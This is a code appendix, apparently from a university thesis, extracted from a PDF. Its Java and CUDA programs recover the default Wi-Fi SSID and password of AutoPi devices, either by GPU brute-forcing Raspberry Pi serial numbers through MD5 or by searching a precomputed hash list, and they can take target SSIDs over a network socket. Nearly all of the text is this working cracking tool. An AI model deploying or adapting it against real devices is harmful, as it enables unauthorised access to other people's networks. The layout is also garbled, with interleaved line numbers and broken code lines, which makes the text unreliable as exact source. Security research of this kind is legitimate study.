CreateSortedWordlist.HASH_LENGTH).limit((int)amountOfBytesToRead);

// remove hashes from disk
// if crash or interrupt, data lost
this.raf.setLength(raf.length() - amountOfBytesToRead);

// done, clear raf and remove file form disk
if (this.noMoreHashesOnDisk) {

this.raf.close();
this.raf = null;
new File(this.path).delete();

}

}

// fetching done, reset flag and notify if there are waiting threads
synchronized(this.bufferAvailableMonitor) {

if (!this.noMoreHashesOnDisk)

this.bufferAvailable[currentBuffer] = true;

this.bufferAvailableMonitor.notify();

}

} catch(Exception e) {

e.printStackTrace();

}

}

byte[] pop() throws InterruptedException {

if (this.noMoreHashesOnDisk && this.buffer[this.currentBuffer].limit() <= 0)

return null;

byte[] result = popBuffer();

// buffer empty, create thread to fetch more and goto next buffer
if (this.buffer[this.currentBuffer].limit() <= 0) {

this.bufferAvailable[this.currentBuffer] = false;

// TODO: use a pool of threads instead of creating new ones?
// TODO: some sort of queue system since reads from file can become out of order
int threadCurrentBuffer = this.currentBuffer;
new Thread() {

@Override
public void run(){

fetchHashesFromDisk(threadCurrentBuffer);

}

}.start();

// go to next buffer, loop around to zero if needed
if (++this.currentBuffer >= CreateSortedWordlist.AMOUNT_OF_INPUT_BUFFERS_PER_BLOCK)

this.currentBuffer = 0;

// wait if next buffer isn’t available
synchronized(this.bufferAvailableMonitor) {

while (this.bufferAvailable[this.currentBuffer] == false) {

if (this.noMoreHashesOnDisk)

return result;

this.bufferAvailableMonitor.wait();

}

915
916
917
918
919
920
921
922
923
924
925
926
927
928
929
930
931
932
933
934
935
936
937
938
939
940
941
942
943
944
945
946
947
948
949
950
951
952
953
954
955
956
957
958
959
960
961
962
963

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24

}

}

return result;

}

byte[] peek() throws InterruptedException {

if (this.noMoreHashesOnDisk && this.buffer[this.currentBuffer].limit() <= 0)

return null;

return peekBuffer();

}

// reads in reverse
private byte[] popBuffer() {

int oldPosition = this.buffer[this.currentBuffer].position();
int oldLimit = this.buffer[this.currentBuffer].limit();
int newPosition, newLimit;

if (oldLimit == 0)

return null;

byte[] result = new byte[CreateSortedWordlist.HASH_LENGTH];
this.buffer[this.currentBuffer].get(result, 0, result.length); // not thread safe

if (oldPosition == 0) {
newPosition = 0;
newLimit = 0;

} else {

newPosition = oldPosition - CreateSortedWordlist.HASH_LENGTH;
newLimit = oldLimit - CreateSortedWordlist.HASH_LENGTH;

}

this.buffer[this.currentBuffer].position(newPosition).limit(newLimit);

return result;

}

// reads in reverse
private byte[] peekBuffer() {

int oldPosition = this.buffer[currentBuffer].position();

byte[] result = new byte[CreateSortedWordlist.HASH_LENGTH];
this.buffer[this.currentBuffer].get(result, 0, result.length); // not thread safe
this.buffer[this.currentBuffer].position(oldPosition);

return result;

}

}

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.RandomAccessFile;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class SearchWordlist {

static final int HASH_LENGTH = 16;
static boolean REMOTE;
PORT;
static int
static String PATH;

SearchWordlist.java

// 16 bytes (= 128 bits per md5 hash)

AMOUNT_OF_HASHES_IN_FILE;

static long
static String GOALSSID_PREFIX;
static String GOALSSID;
static String HASH;

static RandomAccessFile RAF;
static ServerSocket serverSocket;
static Socket socket;

25
26
27
28

29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68

69
70
71
72
73
74

75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96

public static void main(String[] args) throws FileNotFoundException, IOException, Exception {
// path to sorted list
// if (true): fetch ssid from remote host, else: receive ssid

PATH = "list";
REMOTE = true;
from System.in
PORT = 7001;
GOALSSID_PREFIX = "AutoPi-";

// port to listen to if REMOTE == true
// prefix of SSID

if (REMOTE)

serverSocket =

new ServerSocket(PORT);

quit:
do {

RAF = new RandomAccessFile(PATH, "r");
AMOUNT_OF_HASHES_IN_FILE = RAF.length() / HASH_LENGTH;

if (REMOTE)

GOALSSID = receiveSsid();

else {

Scanner s = new Scanner(System.in);

while (true) {

System.out.print("12 last chars of the SSID (q): ");
GOALSSID = s.nextLine().toLowerCase();

if (GOALSSID.length() == 12)

break;

else if (GOALSSID.equals("q") || GOALSSID.equals("quit"))

break quit;

else

System.out.println("Input needs to be 12 chars");

}

}

long start = 0;
long end = AMOUNT_OF_HASHES_IN_FILE - 1;

long startTime = System.nanoTime();

// find correct hash with recursive binary search
HASH = binarySearch(start, end);

// if hash != null: match found, else: no match found
if (HASH != null) {

System.out.println("Match found! (" + ((System.nanoTime() - startTime)/(Math.pow(10,6)))
+ " ms)");
if (REMOTE)

sendString(HASH);

//display result
System.out.printf("\n%-15s%s", "SSID: ", "AutoPi-" + HASH.substring(20));
System.out.printf("\n%-15s%s", "Password: ", HASH.substring(0,8) + "-" +
HASH.substring(8, 12));
System.out.printf("\n%-15s%s\n", "Full hash: ", HASH);

} else {

if (REMOTE)

sendString("Error: No match found for SSID " + GOALSSID_PREFIX + GOALSSID + ".");

throw new Exception("Error: No match found for received SSID.");

}

} while(REMOTE);

}

static String binarySearch(long first, long last) throws IOException {

long middle = (first + last) / 2;

String current = read(middle);
int result = GOALSSID.compareTo(current.substring(20)); // compare last 12 chars

if (result == 0)

// correct hash found

return current;

else if (first >= last) // no match found

return null;
else if (result > 0)

// ssid > current

return binarySearch(middle+1, last);

97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21

22
23

else

// ssid < current
return binarySearch(first, middle-1);

}

static String read(long index) throws IOException {
byte[] hashInBytes = new byte[HASH_LENGTH];

RAF.seek(HASH_LENGTH * index);
RAF.read(hashInBytes);

StringBuilder sb = new StringBuilder(HASH_LENGTH * 2);
for(byte b : hashInBytes)

sb.append(String.format("%02x", b));

return sb.toString().toLowerCase();

}

/*
* Listen on port PORT for SSID and return the SSID as string
*/
static String receiveSsid() throws IOException {

System.out.println("\n----- Listening on port " + PORT + " -----");
socket = serverSocket.accept();
System.out.println("Connected to " + socket.getRemoteSocketAddress() + ". Waiting for SSID.");

BufferedReader br = new BufferedReader(new InputStreamReader (socket.getInputStream()));
String ssid = br.readLine();
System.out.println("Received SSID: " + ssid + ".");

// can receive either last 12 chars or whole ssid including the prefix "AutoPi-"
if (!(ssid.length() == 12 || ssid.length() == 19)) {

sendString("Error: String sent to server has incorrect format!");
throw new IOException("Received string has incorrect format!");

}

String[] splitSsid = ssid.split("-");
return splitSsid.length > 1 ? splitSsid[1] : splitSsid[0];

}

/*
* Send data over socket
*/
public static void sendString(String string) throws IOException {

new PrintWriter(socket.getOutputStream(), true).println(string);
System.out.println("\"" + string + "\" sent.");
socket.close();

CrackWiﬁGPU.java

}

}

import java.io.*;
import java.math.BigInteger;
import java.net.*;
import java.security.MessageDigest;
import java.util.Scanner;
import jcuda.Pointer;
import jcuda.Sizeof;
import jcuda.driver.CUcontext;
import jcuda.driver.CUdevice;
import jcuda.driver.CUdeviceptr;
import jcuda.driver.CUfunction;
import jcuda.driver.CUmodule;
import jcuda.driver.JCudaDriver;

/*

*/

Adapted from http://macs-site.net/md5oncudawhitepaper.html (Matthew McClaskey)

public class CrackWifiGPU {

static final int NUM_BLOCKS_X = 4096;
character 1, 2 & 3
static final int NUM_BLOCKS_Y = 1;
static final int NUM_THREADS_PER_BLOCK = 256;
character 4 & 5

// blockIds from 0 -> 0xfff => serial number

// threadIds from 0 -> 0xff

=> serial number

24

25
26

27

28
29
30
31
32
33
34
35
36
37
38

39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94

static final int SERIAL_LEN = 16;
exluding linebreak)

// length of serial number (padded with 8 zeros and

static final boolean COMPILECUBIN = true;
hashgpuv3.cu file
static final boolean REMOTE = true;
ssid from System.in}
static final int PORT = 7000;
static final String CUBIN_PATH = "hashgpuv3.cu";
static ServerSocket serverSocket;
static Socket socket;

// needs to be recompiled after changes in the

// if(true) {listen on PORT for input} else {get

public static void main(String[] args) throws IOException
{

if (REMOTE)

serverSocket =

new ServerSocket(PORT);

// do-while(REMOTE) ensures infinity iterations for remote execution and only one if the input
is from System.in
quit:
do {

try {

String ssid;
if (REMOTE)

ssid = receiveSsid();

else {

Scanner s = new Scanner(System.in);
while (true) {

System.out.print("12 last chars of SSID: ");
ssid = s.nextLine();

if (ssid.length() == 12)

break;

else if (ssid.equals("q") || ssid.equals("quit") || ssid.equals("exit"))

break quit;

else

System.out.println("Input needs to be 12 chars");

}

}

long startTime = System.nanoTime();

int[] tmp;
try {

tmp = hexToHash(ssid.toLowerCase());

} catch (IOException e) {

if (REMOTE)

sendString("Error: Couldn’t convert hashHexString to hashInteger.");

e.printStackTrace();
continue;

}

int[] hashin = new int[2];
hashin[0] = tmp[0];
hashin[1] = tmp[1];

//compile GPU code if required
String cubinFileName = prepareCubinFile(CUBIN_PATH, COMPILECUBIN);

// Initialize the driver and create a context for the first device.
JCudaDriver.cuInit(0);
CUcontext pctx = new CUcontext();
CUdevice dev = new CUdevice();
JCudaDriver.cuDeviceGet(dev, 0);
JCudaDriver.cuCtxCreate(pctx, 0, dev);

// Load the CUBIN file.
CUmodule module = new CUmodule();
JCudaDriver.cuModuleLoad(module, cubinFileName);

// Obtain a function pointer to the "Parrallel_Hash" function.
CUfunction function = new CUfunction();
JCudaDriver.cuModuleGetFunction(function, module, "Parrallel_Hash");

//allocate memory on device

95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117

118
119
120
121
122
123
124
125
126
127
128
129

130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146

147
148
149
150
151
152
153
154
155

156
157
158
159
160
161
162
163
164
165

CUdeviceptr inPtr = new CUdeviceptr();
JCudaDriver.cuMemAlloc(inPtr, hashin.length * Sizeof.INT);

//transfer hash to device
JCudaDriver.cuMemcpyHtoD(inPtr, Pointer.to(hashin), Sizeof.INT * 2);

//allocate device output
CUdeviceptr serialPtr = new CUdeviceptr();
JCudaDriver.cuMemAlloc(serialPtr, SERIAL_LEN * Sizeof.BYTE);

//setup execution form (threads and blocks)
JCudaDriver.cuFuncSetBlockShape(function, NUM_THREADS_PER_BLOCK, 1, 1);

//set parameters
Pointer dIn = Pointer.to(inPtr);
Pointer dSerial = Pointer.to(serialPtr);

JCudaDriver.cuParamSetv(function, 0, dIn, Sizeof.POINTER);
JCudaDriver.cuParamSetv(function, Sizeof.POINTER*1, dSerial, Sizeof.POINTER);

JCudaDriver.cuParamSetSize(function, Sizeof.POINTER * 2);

System.out.println("Setup done (" + ((System.nanoTime() - startTime)/(Math.pow(10,6))) +
" ms)");

startTime = System.nanoTime();

//call function
JCudaDriver.cuLaunchGrid(function, NUM_BLOCKS_X, NUM_BLOCKS_Y);
JCudaDriver.cuCtxSynchronize();

//get output
byte[] hostOutSerial = new byte[SERIAL_LEN];
JCudaDriver.cuMemcpyDtoH(Pointer.to(hostOutSerial), serialPtr, SERIAL_LEN * Sizeof.BYTE);

System.out.println("Cracking done (" + ((System.nanoTime() -
startTime)/(Math.pow(10,6))) + " ms)");

boolean matchFound = false;
for (int i = 0; i < SERIAL_LEN; i++) {

if (hostOutSerial[i] != 0)
matchFound = true;

}
if (!matchFound) {

if (REMOTE) {

// if all bytes == 0, no match found

sendString("Error: No match found for SSID AutoPi-" + ssid);
continue;

}
throw new Exception("Error: No match found for SSID AutoPi-" + ssid);

}

// Hash the resulting serial number to produce ssid, pw etc.
MessageDigest md = MessageDigest.getInstance("MD5");
String serialString = padZeros(16, byteArrayToString(hostOutSerial)) + "\n";
"ECHO"-COMMAND ADDS A NEW LINE CHAR
BigInteger hash = new BigInteger(1, md.digest(serialString.getBytes("UTF-8")));
String hashString = padZeros(32, hash.toString(16));

//

if (REMOTE)

sendString(hashString);

//display result
System.out.printf("\n%-15s%s", "SSID: ", "AutoPi-" + hashString.substring(20));
System.out.printf("\n%-15s%s", "Password: ", hashString.substring(0,8) + "-" +
hashString.substring(8, 12));
System.out.printf("\n%-15s%s", "Serial number: ", serialString.replace("\n", ""));
System.out.printf("\n%-15s%s\n", "Full hash: ", hashString);

} catch(Exception e) {

e.printStackTrace();

}

} while(REMOTE);

}

public static String padZeros(int length, String hexString) {

StringBuilder sb = new StringBuilder();

166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240

for (int i = 0; i < length-hexString.length(); i++) {

sb.append(’0’);

}
return sb.toString() + hexString;

}

public static String byteArrayToString(byte[] hexBytes) {

StringBuilder sb = new StringBuilder();
for (int i = 0; i < hexBytes.length; i++) {

sb.append((char)hexBytes[i]);

}
return sb.toString();

}

/*
* Listen on port PORT for SSID and return the SSID as string
*/
public static String receiveSsid() throws IOException {

System.out.println("\n----- Listening on port " + PORT + " -----");
socket = serverSocket.accept();
System.out.println("Connected to " + socket.getRemoteSocketAddress() + ". Waiting for SSID.");

BufferedReader br = new BufferedReader(new InputStreamReader (socket.getInputStream()));
String ssid = br.readLine();
System.out.println("Received SSID: " + ssid + ".");

// can receive either last 12 chars or whole ssid (including the prefix "AutoPi-")
if (!(ssid.length() == 12 || ssid.length() == 19)) {

sendString("Error: String sent to server has incorrect format!");
throw new IOException("Received string has incorrect format!");

}

String[] splitSsid = ssid.split("-");
return splitSsid.length > 1 ? splitSsid[1] : splitSsid[0];

}

/*
* Send data over socket
*/
public static void sendString(String string) throws IOException {

PrintWriter pw = new PrintWriter(socket.getOutputStream(), true);
pw.println(string);
System.out.println("\"" + string + "\" sent.");
socket.close();

}

/**

* Converts a user-friendly hex based hash to 4 integers
* @param hash
* @return
* @throws java.io.IOException
*/

public static int[] hexToHash(String hash) throws IOException
{

if (hash.length() != 12)

throw new IOException("Invalid hash input.");

hash = "0000" + hash;
int[] result = new int[2];

// padding with 4 zeros to fill 16 bytes

String tmp;
for (int i = 0; i <= 8; i += 8)
{

//get next 4 bytes in reverse order
tmp = hash.substring(i + 6, i + 8) +

hash.substring(i + 4, i + 6) +
hash.substring(i + 2, i + 4) +
hash.substring(i + 0, i + 2);

//convert to integer
result[(i + 1) / 8] = (int)Long.parseLong(tmp, 16);

}

return result;

}

241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315

/**

* modified by Matt McClaskey, based on example provided in JCUDA documentation
* www.jcuda.org
* The extension of the given file name is replaced with cubin.
* If the file with the resulting name does not exist, it is
* compiled from the given file using NVCC. The name of the
* cubin file is returned.
*
* @param cuFileName The name of the .CU file
* @return The name of the CUBIN file
* @throws IOException If an I/O error occurs
*/

private static String prepareCubinFile(String cuFileName, Boolean overwrite) throws IOException
{

int endIndex = cuFileName.lastIndexOf(’.’);
if (endIndex == -1)
{

endIndex = cuFileName.length()-1;

}
String cubinFileName = cuFileName.substring(0, endIndex+1)+"cubin";
//System.out.print(cubinFileName);
File cubinFile = new File(cubinFileName);
//System.out.print(cubinFile.getAbsolutePath());
if (!overwrite && cubinFile.exists())
{

return cubinFileName;

}

File cuFile = new File(cuFileName);
if (!cuFile.exists())
{

throw new IOException("Input file not found: "+cuFileName);

}

String modelString = "-m"+System.getProperty("sun.arch.data.model");
String command =

"nvcc " + modelString + " -arch sm_61 -cubin "+
cuFile.getPath()+" -o "+cubinFileName;

//System.out.println("Executing\n"+command);
Process process = Runtime.getRuntime().exec(command);

String errorMessage = new String(toByteArray(process.getErrorStream()));
String outputMessage = new String(toByteArray(process.getInputStream()));
int exitValue = 0;
try
{

exitValue = process.waitFor();

}
catch (InterruptedException e)
{

Thread.currentThread().interrupt();
throw new IOException("Interrupted while waiting for nvcc output", e);

}

if (exitValue != 0)
{

System.out.println("errorMessage:\n"+errorMessage);
System.out.println("outputMessage:\n"+outputMessage);
throw new IOException("Could not create .cubin file: "+errorMessage);

}

return cubinFileName;

}

/**

* this method was taken from JCuda documentation
* www.jcuda.org
* Fully reads the given InputStream and returns it as a byte array.
*
* @param inputStream The input stream to read
* @return The byte array containing the data from the input stream
* @throws IOException If an I/O error occurs
*/

316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53

54

private static byte[] toByteArray(InputStream inputStream) throws IOException
{

ByteArrayOutputStream baos = new ByteArrayOutputStream();
byte buffer[] = new byte[8192];
while (true)
{

int read = inputStream.read(buffer);
if (read == -1)
{

break;

}
baos.write(buffer, 0, read);

}
return baos.toByteArray();

}

}

/* MD5
Original algorithm by RSA Data Security, Inc
Adapted for NVIDIA CUDA by Matthew McClaskey

hashgpuv3.cu

Copyright (C) 1991-2, RSA Data Security, Inc. Created 1991. All
rights reserved.

License to copy and use this software is granted provided that it
is identified as the "RSA Data Security, Inc. MD5 Message-Digest
Algorithm" in all material mentioning or referencing this software
or this function.

License is also granted to make and use derivative works provided
that such works are identified as "derived from the RSA Data
Security, Inc. MD5 Message-Digest Algorithm" in all material
mentioning or referencing the derived work.

RSA Data Security, Inc. makes no representations concerning either
the merchantability of this software or the suitability of this
software for any particular purpose. It is provided "as is"
without express or implied warranty of any kind.

These notices must be retained in any copies of any part of this
documentation and/or software.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <math.h>

const unsigned int S11 = 7;
const unsigned int S12 = 12;
const unsigned int S13 = 17;
const unsigned int S14 = 22;
const unsigned int S21 = 5;
const unsigned int S22 = 9;
const unsigned int S23 = 14;
const unsigned int S24 = 20;
const unsigned int S31 = 4;
const unsigned int S32 = 11;
const unsigned int S33 = 16;
const unsigned int S34 = 23;
const unsigned int S41 = 6;
const unsigned int S42 = 10;
const unsigned int S43 = 15;
const unsigned int S44 = 21;

const unsigned int pwdbitlen = 136; //<--number of bits in plain text

/* F, G, H and I are basic MD5 functions */
__device__ inline unsigned int F(unsigned int x, unsigned int y, unsigned int z) { return (((x) & (y)) |
((˜x) & (z))); }
__device__ inline unsigned int G(unsigned int x, unsigned int y, unsigned int z) { return (((x) & (z)) |
((y) & (˜z))); }

55

56

57
58
59
60
61
62

63
64
65
66
67

68
69
70
71
72

73
74
75
76
77

78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102

103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122

__device__ inline unsigned int H(unsigned int x, unsigned int y, unsigned int z) { return ((x) ˆ (y) ˆ
(z)); }
__device__ inline unsigned int I(unsigned int x, unsigned int y, unsigned int z) { return ((y) ˆ ((x) |
(˜z))); }

/* ROTATE_LEFT rotates x left n bits */
#define ROTATE_LEFT(x, n) (((x) << (n)) | ((x) >> (32-(n))))

/* Rotation is separate from addition to prevent recomputation */
__device__ inline void FF(unsigned int &a, unsigned int b, unsigned int c, unsigned int d, unsigned int
x, unsigned int s, unsigned int ac)
{

a = ROTATE_LEFT(a + F(b, c, d) + x + ac, s) + b;

}

__device__ inline void GG(unsigned int &a, unsigned int b, unsigned int c, unsigned int d, unsigned int
x, unsigned int s, unsigned int ac)
{

a = ROTATE_LEFT(a + G(b, c, d) + x + ac, s) + b;

}

__device__ inline void HH(unsigned int &a, unsigned int b, unsigned int c, unsigned int d, unsigned int
x, unsigned int s, unsigned int ac)
{

a = ROTATE_LEFT(a + H(b ,c ,d) + x + ac, s) + b;

}

__device__ inline void II(unsigned int &a, unsigned int b, unsigned int c, unsigned int d, unsigned int
x, unsigned int s, unsigned int ac)
{

a = ROTATE_LEFT(a + I(b, c, d) + x + ac, s) + b;

}

/*

index:
bytes:

=> OUTPUT

INPUT
01234567 => 32107654
abcdefgh => dcbagdfe

*/
__device__ void xToCharArray(unsigned char output[], unsigned int input[])
{

for (unsigned int i = 0, j = 0; i < 16; j+=4, i++)
{

output[j + 0] = (unsigned char) ((input[i] >> 8*0) & 0xff);
output[j + 1] = (unsigned char) ((input[i] >> 8*1) & 0xff);
output[j + 2] = (unsigned char) ((input[i] >> 8*2) & 0xff);
output[j + 3] = (unsigned char) ((input[i] >> 8*3) & 0xff);

}

}

extern "C" __global__ void Parrallel_Hash(unsigned int *input, char *output)
{

unsigned int a, b, c, d;

unsigned int x[5];
serial number)

// will contain the "message" to be hashed (in this case the raspberry pi

unsigned int charLen = 8; // length of char
unsigned char hexLookup[] = "0123456789abcdef";

/*

SETUP for x[0] & x[1] - padding with 8 ascii zeros
4 iterations:
0’
x[0] = x[1] = ’
x[0] = x[1] = ’
00’
x[0] = x[1] = ’ 000’
x[0] = x[1] = ’0000’

*/
x[0] = 0;
x[1] = 0;
for (int i = 0; i < 4; i++) {

x[0] += hexLookup[0] << charLen*i; // ’48’ ascii = 0
x[1] += hexLookup[0] << charLen*i;

SETUP for 2 & 3 - getting first 5 chars from block/thread-id

}

/*

123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197

blockId (12 bits) = xxxx,yyyy,zzzz
threadId (8 bits) = rrrr,ssss
take 4 bit hex from id, lookup corresponding hex char (8 bit ascii) and append to x array

*/

x[2] = 0;
x[3] = 0;
x[2] += hexLookup[(blockIdx.x & 0xf00) >> 8] << charLen*3;
x[2] += hexLookup[(blockIdx.x & 0x0f0) >> 4] << charLen*2;
x[2] += hexLookup[(blockIdx.x & 0x00f)]
<< charLen*1;
x[2] += hexLookup[(threadIdx.x & 0xf0) >> 4] << charLen*0;
<< charLen*3;
x[3] += hexLookup[(threadIdx.x & 0x0f)]

’
// x[2] = ’x
// x[2] = ’xy
’
// x[2] = ’xyz ’
// x[2] = ’xyzr’
’
// x[3] = ’t

/*

SETUP for 4 - adding linebreak & delimiter bit (used by md5 alg) - LITTLE ENDIAN!
delimiter = 1000,0000 bits = 128 decimal
ascii 10 = ’\n’
x[4] = {’\n’, 128, 0, 0} => (little endian) => {0, 0, 128, 10}

*/
x[4] = 0;
x[4] += 10
<< charLen*0;
x[4] += 128 << charLen*1;

// x[4] = ’
// x[4] = ’

\n’

d\n’, d = 1 bit delimiter used by md5

/*

*/

The complete content of the "message"(x) to be hashed:
32 bit integer in every "x" which gives 4 characters per "x"
x[0] == ’0000’
x[1] == ’0000’
x[2] == ’xyzr’
x[3] == ’sijk’
x[4] == ’

(i, j & k changes in the loops underneath)

d\n’

// ASCII 0(48) -> 9(57) & a(97) -> f(102)
// this loop sets 6th char
for (unsigned int i = 48; i <= 102; i++)
{

x[3] &= ˜(0xff << charLen*2);
x[3] += (i << charLen*2);

// erase last loops value
// x[3] = ’ti

’

// this loop sets 7th char
for (unsigned int j = 48; j <= 102; j++)
{

x[3] &= ˜(0xff << charLen*1);
x[3] += (j << charLen*1);

// erase last loops value
// x[3] = ’tij ’

// this loop sets 8th char
for (unsigned int k = 48; k <= 102; k++)
{

x[3] &= ˜(0xff << charLen*0);
x[3] += (k << charLen*0);

// erase last loops value
// x[3] = ’tijk’

//load magic numbers
a = 0x67452301;
b = 0xefcdab89;
c = 0x98badcfe;
d = 0x10325476;

0x242070db); // 3

// Round 1
FF ( a, b, c, d, x[ 0], S11, 0xd76aa478); // 1
FF ( d, a, b, c, x[ 1], S12, 0xe8c7b756); // 2
FF ( c, d, a, b, x[ 2], S13,
FF ( b, c, d, a, x[ 3], S14, 0xc1bdceee); // 4
FF ( a, b, c, d, x[ 4], S11, 0xf57c0faf); // 5
FF ( d, a, b, c, 0, S12, 0x4787c62a); // 6
FF ( c, d, a, b, 0, S13, 0xa8304613); // 7
FF ( b, c, d, a, 0, S14, 0xfd469501); // 8
FF ( a, b, c, d, 0, S11, 0x698098d8); // 9
FF ( d, a, b, c, 0, S12, 0x8b44f7af); // 10
FF ( c, d, a, b, 0, S13, 0xffff5bb1); // 11
FF ( b, c, d, a, 0, S14, 0x895cd7be); // 12
FF ( a, b, c, d, 0, S11, 0x6b901122); // 13
FF ( d, a, b, c, 0, S12, 0xfd987193); // 14
FF ( c, d, a, b, pwdbitlen, S13, 0xa679438e); // 15

198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272

FF ( b, c, d, a, 0, S14, 0x49b40821); // 16

// Round 2
GG (a, b, c, d, x[ 1], S21, 0xf61e2562); // 17
GG (d, a, b, c, 0, S22, 0xc040b340); // 18
GG (c, d, a, b, 0, S23, 0x265e5a51); // 19
GG (b, c, d, a, x[ 0], S24, 0xe9b6c7aa); // 20
GG (a, b, c, d, 0, S21, 0xd62f105d); // 21
GG (d, a, b, c, 0, S22,
0x2441453); // 22
GG (c, d, a, b, 0, S23, 0xd8a1e681); // 23
GG (b, c, d, a, x[ 4], S24, 0xe7d3fbc8); // 24
GG (a, b, c, d, 0, S21, 0x21e1cde6); // 25
GG (d, a, b, c, pwdbitlen, S22, 0xc33707d6); // 26
GG (c, d, a, b, x[ 3], S23, 0xf4d50d87); // 27
GG (b, c, d, a, 0, S24, 0x455a14ed); // 28
GG (a, b, c, d, 0, S21, 0xa9e3e905); // 29
GG (d, a, b, c, x[ 2], S22, 0xfcefa3f8); // 30
GG (c, d, a, b, 0, S23, 0x676f02d9); // 31
GG (b, c, d, a, 0, S24, 0x8d2a4c8a); // 32

// Round 3
HH (a, b, c, d, 0, S31, 0xfffa3942); // 33
HH (d, a, b, c, 0, S32, 0x8771f681); // 34
HH (c, d, a, b, 0, S33, 0x6d9d6122); // 35
HH (b, c, d, a, pwdbitlen, S34, 0xfde5380c); // 36
HH (a, b, c, d, x[ 1], S31, 0xa4beea44); // 37
HH (d, a, b, c, x[ 4], S32, 0x4bdecfa9); // 38
HH (c, d, a, b, 0, S33, 0xf6bb4b60); // 39
HH (b, c, d, a, 0, S34, 0xbebfbc70); // 40
HH (a, b, c, d, 0, S31, 0x289b7ec6); // 41
HH (d, a, b, c, x[ 0], S32, 0xeaa127fa); // 42
HH (c, d, a, b, x[ 3], S33, 0xd4ef3085); // 43
HH (b, c, d, a, 0, S34,
0x4881d05); // 44
HH (a, b, c, d, 0, S31, 0xd9d4d039); // 45
HH (d, a, b, c, 0, S32, 0xe6db99e5); // 46
HH (c, d, a, b, 0, S33, 0x1fa27cf8); // 47
HH (b, c, d, a, x[ 2], S34, 0xc4ac5665); // 48

// Round 4
II (a, b, c, d, x[ 0], S41, 0xf4292244); // 49
II (d, a, b, c, 0, S42, 0x432aff97); // 50
II (c, d, a, b, pwdbitlen, S43, 0xab9423a7); // 51
II (b, c, d, a, 0, S44, 0xfc93a039); // 52
II (a, b, c, d, 0, S41, 0x655b59c3); // 53
II (d, a, b, c, x[ 3], S42, 0x8f0ccc92); // 54
II (c, d, a, b, 0, S43, 0xffeff47d); // 55
II (b, c, d, a, x[ 1], S44, 0x85845dd1); // 56
II (a, b, c, d, 0, S41, 0x6fa87e4f); // 57
II (d, a, b, c, 0, S42, 0xfe2ce6e0); // 58
II (c, d, a, b, 0, S43, 0xa3014314); // 59
II (b, c, d, a, 0, S44, 0x4e0811a1); // 60
II (a, b, c, d, x[ 4], S41, 0xf7537e82); // 61
II (d, a, b, c, 0, S42, 0xbd3af235); // 62
II (c, d, a, b, x[ 2], S43, 0x2ad7d2bb); // 63
II (b, c, d, a, 0, S44, 0xeb86d391); // 64

a += 0x67452301;
b += 0xefcdab89;
c += 0x98badcfe;
d += 0x10325476;

//check if last 12 characters of hash matches
if (((c >> charLen*2) & 0xffff) == ((input[0] >> charLen*2) & 0xffff) && d == input[1])
{

// convert correct from integer to char array
unsigned char result[16];
xToCharArray(&result[0], &x[0]);

// insert result into output pointer that can be accessed from the "main" program
for (int i = 0; i < 16; i++)

*(output + i) = result[i];

}

if (k == 57)
k = 96; // will be incremented to 97 at the end of this loop (going from last ascii

number (57 == ’9’) to first ascii letter (97 == ’a’))

}
if (j == 57)

j = 96; // will be incremented to 97 at the end of this loop

if (i == 57)

i = 96; // will be incremented to 97 at the end of this loop

273
274
275
276
277
278
279
280

}

}

}

TRITA-EECS-EX-2019:225

www.kth.se


